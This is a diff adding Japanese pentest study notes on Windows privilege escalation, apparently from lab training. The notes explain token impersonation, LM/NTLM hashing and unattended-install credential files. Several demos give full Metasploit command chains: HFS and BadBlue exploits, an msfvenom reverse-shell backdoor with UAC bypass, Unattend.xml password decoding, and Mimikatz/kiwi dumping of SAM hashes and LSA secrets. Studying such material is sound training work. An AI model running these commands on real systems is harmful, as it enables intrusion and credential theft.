@@ -64,9 +64,186 @@ windowsカーネルエクスプロイト
 1) カーネルの脆弱性の特定
 2) カーネルエクスプロイトをダウンロード、コンパイル、ターゲットシステムへの転送
 
-demo
-1) 
+demo UACbypass
+1) ping -c 4 target
+2) nmap target
+3) nmap -sV -p port target
+4) searchsploit hfs
+5) use exploit/windows/http/rejetto_hfs_exec
+6) set RHOSTS target
+   set LHOST 10.1.0.6
+7) exploit
+8) getuid
+9) sysinfo
+10) ps -S explorer.exe
+    migrate [PID]
+11) getsystem (失敗を確認)
+12) shell
+    net localgroup administrators
+    exit
+13) background
+    
+# ローカルマシンで作業
+14) msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.0.6 LPORT=4444 -f exe > backdoor.exe
+    file backdoor.exe
 
+# Meterpreterに戻る
+15) sessions -i 1
+    cd C:\\Users\\admin\\AppData\\Local\\Temp
+    upload /root/Desktop/tools/UACME/Akagi64.exe .
+    upload /root/backdoor.exe .
+    ls
+
+# 別ターミナルでハンドラー起動
+16) msfconsole -q
+    use exploit/multi/handler
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST 10.1.0.6
+    set LPORT 4444
+    exploit -j
+
+# 元のセッションに戻る
+17) shell
+    Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+    exit
+
+# 新しいセッション（ハンドラー側）で作業
+18) getuid  # NT AUTHORITY\SYSTEMを確認
+19) ps -S lsass.exe
+    migrate [PID]
+20) hashdump
+
+アクセストークンの偽装
+・Windowsのアクセストークンは、Windows認証プロセスの中核要素であり、Local Security Authority Subsystem Service によって作成、管理される
+・Windowsのアクセストークンは、システム上で動作するプロセスやスレッドのセキュリティコンテキストを識別・記述する役割を担います。
+→つまり、アクセストークンとは一時的な鍵でプロセスを起動したりシステム資源にアクセスするたびに都度資格情報を入力することなく、ユーザにシステムやネットワークリソースへのアクセス権を提供する。
+・アクセストークンは、ユーザが正常に認証されるたびにwinlogon.exeによって生成され、当該スレッド/プロセスに関連付けされたユーザアカウントの識別情報と権限を含む
+このトークンは、userinit.exeプロセスに付与され、その後、そのユーザが起動する子プロセスは作成元からアクセストークンのコピーに継承し、同じトークンに紐づいた権限で動作する
+
+・Windowsのアクセストークンは、割り当てられたセキュリティレベルに応じて分類する。
+そのため、アクセストークンを見るとセキュリティレベルを見ることができる。
+・アクセストークンには以下のセキュリティレベルが割り当てられる
+1) impersonateレベルのトークン
+Windows上での非対話的ログオン（通常は特定のシステムサービスやドメインログオン経由）によって作成される
+2) Delegate
+対話的ログオン（通常のログインやRDPのようなリモートアクセス経路）によって作成される
+・impersonateは、ローカル上では偽装可能だが、そのトークンで外部のシステム上でのなりすましはできない
+・Delegateは、最も危険で、任意のシステム上でもなりすましが可能
+
+・アクセストークンを使ってなりすましを行いシステム上で権限を昇格させるプロセスは、最初に侵害した割り当てられた権限や利用可能な「なりすまし/委任」トークンに大きく依存する
+・成功するなりすまし攻撃に必要とされる代表的な権限は以下の通りである
+1) SeAssignOrimaryToken：プロセスにプライマリトークンを割り当てることを許可する
+　　　　　　　　　　　　　　　これによりトークンを他のプロセスに付与できるようになる
+2) SeCreateToken：管理権限を持つ任意のトークンを作成することを許可する
+3) SeImpersonatePrivilege：別のユーザでのセキュリティコンテキストでプロセスを作成することを許可する
+
+・igcognitoは、meterpreterに標準で組み込まれたモジュールで元々は独立したアプリケーションとして開発された
+成功した侵入の後にユーザトークンのなりすましをする機能を提供する
+・このincongnitoモジュールを使うことで現在のなりすまし可能なトークンの一覧を表示おし、どのユーザの権限に昇格できるかを確認する。
+
+windows passcodeのハッシュ化
+・windowsOSは、ユーザアカウントのパスワードをハッシュ化し、ローカルのSAMデータベースに保存する。
+・ハッシュ化とは、あるデータを別の値に変換するプロセス
+ハッシュ関数やアルゴリズムを使って新しい値を生成する。
+→ハッシュ化によって生成した値をハッシュ値という。
+・クレデンシャルの検証は、LSAによって行う。
+・windows 2003年までは、「NTLM」と「LM」が使用されていたが、Vista以降では、「NTLM」のみを採用
+
+・SAMは、Windows上でユーザアカウントとパスワードを管理するためのデータベースファイルである
+→SAMデータベース内に保存されている全てのユーザアカウントのパスワードはハッシュ化されている。
+・SAMデータベースファイルは、OSが稼働中はコピーできない。
+・windowsNTカーネルはSAMデータベースファイルをろっくしており、その結果、攻撃者は通常、メモリ上のテクニックツールを使用して、LSASSプロセスからSAMハッシュをダンプする。
+・近年のWindowsでは、SAMデータベースは"SYSKEY"によって暗号化されている。
+
+・LMは、WindowsのOSでNT4.0より前に実装されていたデフォルトのハッシュアルゴリズム
+・このプロトコルは、ユーザパスコードをハッシュ化しており、ハッシュ処理は以下の手順で行う
+1) パスコードは、7文字の2つのチャンクに分割する。
+2) 全ての文字は大文字に変換される
+3) 各チャンクはDESアルゴリズムを用いて別々にハッシュされる
+・LMハッシュは一般に弱いプロトコルと見なされており、容易にクラッキングされる。
+主な理由は、パスワードハッシュにソルトが含まれていないためでその結果ブルートフォース攻撃やレインボーテーブル攻撃がLMハッシュに対して有効になっている。
+
+・NTLMは、Windows上でコンピュータ間の認証を行うために利用される認証プロトコル群
+→認証プロセスでは、有効なユーザ名とパスワードを使用して正常に認証を行う
+・windows vista以降では、windowsはLMハッシュを無効にして、NTLMハッシュを利用する
+・ユーザアカウントが作成されるとそのパスワードはMD4ハッシュアルゴリズムを用いて暗号化され、元のパスコードは破棄される
+・NTLMはLMに比べて次の点で改良されている
+1) ハッシュを2つのチャンクに分割しない
+2) 大文字/小文字を区別する
+3) 記号やUnicode文字の使用を許可する
+
+windows構成ファイル内のパスワードの検索
+・Windowsは多数のシステムへの一括展開やインストールなど、さまざまな繰り返し作業を自動化できる。
+・これは通常、無人インストールユーティリティを使って行われ、windowsの大量のインストール/展開を自動化する。
+・このツールは、特定の設定やユーザアカウントの資格情報、特に、Administratorアカウントのパスワードを含む構成ファイルを利用する
+・無人セットアップの構成ファイルがインストール後にターゲットシステム上に残されていると、これらによってユーザアカウントの資格情報が露出し、攻撃者が正規の資格情報を使ってそのWindowsターゲット認証できる可能性がある
+
+・無人Windowsセットアップユーティリティは、通常、ユーザアカウントやシステム設定情報を含む、次のいずれかの構成ファイルを利用する
+1) C:\Windows\Panther\Unattend.xml
+2) C:\Windows\Panther\Autounattend.xml
+・セキュリティ対策として、無人セットアップ構成ファイルに保存されるパスコードはbase64エンコードされている場合がある。
+
+demo 無人インストール
+1) 攻撃者のマシンに切り替える
+2) whoamiで現在のユーザを確認する
+3) Powershellで、powerup.ps1を実行して、権限昇格の脆弱性を見つける。
+cd .\Desktop\PowerSploit\Privesc\
+ls
+4) PowerUp.ps1スクリプトとInvoke-PrivescAudit関数をインポートする。
+powershell -ep bypass
+. .\PowerUp.ps1
+Invoke-PrivescAudit
+5) Unattend.xmlファイルの存在を確認するために、Unattend.xmlを開く。
+cat C:\Windows\Panther\Unattend.xml
+6) Powershellを使用して管理者パスワードをデコードする
+$password='unattend.xmlで読み取ったパスコード'
+$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
+echo $password
+7) discoverの資格情報を使用して、管理者ユーザとしてコマンドプロンプトを実行している。
+runas.exe /user.administrator cmd
+6)で確認したパスコードの入力
+whoami
+8) kalilinuxの切り替えて、msfを起動する
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+9) cmd.exeでmshtaコマンドを実行して、meterpreterを取得する
+10) kalilinuxに切り替えて、meterpreterを操作
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+11) フラグを見つける
+sessions -i 1
+cd /
+cd C:\\Users\\Administrator\\Desktop
+dir
+cat flag.txt
+
+Mimikatzを用いたハッシュをダンプする
+・Mimikatzは、Benjamin Delpyによって開発されたwindows向けのポストエクスプロイトツールである
+これにより、メモリから平文パスコード、ハッシュ値、Kerberosチケットを抽出できる
+・SAMデータベースは、Windowsシステム上でユーザーのハッシュ化されたパスワードを保存するデータベースファイルです。
+・Mimikatzは、ハッシュがキャッシュされているlsass.exeプロセスメモリからハッシュを抽出するために使用できる
+・あらかじめコンパイルされたmimikatz実行ファイルを使用することもできるが
+もし、Windowsターゲット上でmeterpreterセッションにアクセスできる場合は、meterpreterに組み込まれている拡張モジュールkiwiを利用することも可能
+
+demo kiwiの拡張機能
+1) nmap -sV target
+2) searchsploit badblue
+3) msfconsole
+4) search badblue
+5) use exploit/windows/http/badblue_passthru
+6) set RHOSTS target
+7) exploit
+8) 現在のプロセスをlsass.exeに移行する
+migrate -N lsass.exe
+9) kiwiをロードする。
+load kiwi
+10) creds_allで管理者のNTLMハッシュをゲットする。
+11) kiwiを使用して全てのユーザのNTLMハッシュを抽出する
+lsa_dump_sam
+12) LSAシークレットをダンプしてシステムキーを見つける
+lsa_dump_secrets
 
 
 
